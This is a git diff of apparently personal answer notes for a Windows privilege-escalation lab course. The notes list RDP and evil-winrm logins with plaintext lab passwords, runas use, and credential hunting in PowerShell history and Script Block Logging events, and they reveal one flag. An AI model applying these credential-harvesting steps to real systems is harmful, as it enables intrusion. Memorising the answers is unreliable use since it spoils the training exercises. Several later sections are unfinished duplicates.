@@ -28,7 +28,8 @@ Q4) Enumerate the currently running processes on CLIENTWK221 (VM #2). Find a non
   - once the name is identified use this comand to find the binary `Get-Process <proccess name> | Select-Object Path`
   - go to the directory where the exe is and `type flag.txt`
 
-**16.1.3**    
+**==== 16.1.3 ====**    
+
 Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
   - Use VM #1
   - rdp to machnine `xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.190.220 /h:650`
@@ -51,3 +52,52 @@ Q3)Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGO
   - use this command to runas another user `run-as /user:richmond powerhshell` and when prompted enter password `GothicLifeStyle1337!`
   - once loged in the flag is on the desktop `type C:\Users\richmond\Desktop\flag.txt`
 
+**==== 16.1.4 ====**  
+
+Q1) Follow the steps above and obtain an interactive shell as daveadmin on CLIENTWK220 (VM #1). Enter the flag, which can be found on the desktop.
+  - evil-winrm to machnine `evil-winrm -i 192.168.190.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
+  - cd Desktop adn type flag
+
+Q2) Connect to CLIENTWK220 (VM #1) as daveadmin via RDP. Use the Event Viewer to search for events recorded by Script Block Logging. Find the password in these events.
+  - flag is `ThereIsNoSecretCowLevel1337`
+  - Use VM #1
+  - rdp `xfreerdp /u:daveadmin /p:"qwertqwertqwert123\!\!" /v:192.168.190.220 /h:650`
+  - use event viewer and filter for event id `4101`
+  - find password
+    
+Q3) Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGOATSysAdmin!. Enumerate the machine and use the methods from this section to find credentials. Utilize them and find the flag. 
+  - use VM #2
+  - rdp to target `xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.190.221 /h:650`
+  - get the history ` type C:\Users\mac\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+  - flag is there
+
+**==== 16.1.5 ====**  
+
+Q1) Follow the steps above and obtain an interactive shell as daveadmin on CLIENTWK220 (VM #1). Enter the flag, which can be found on the desktop.
+  - Use VM #1
+
+**==== 16.2.1 ====**  
+
+Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
+  - Use VM #1
+
+**==== 16.2.2 ====**  
+
+Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
+  - Use VM #1
+
+**==== 16.2.3 ====**  
+
+Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
+  - Use VM #1
+
+**==== 16.3.1 ====**  
+
+Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
+  - Use VM #1
+  - 
+**==== 16.2.2 ====**
+
+Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
+  - Use VM #1
+    
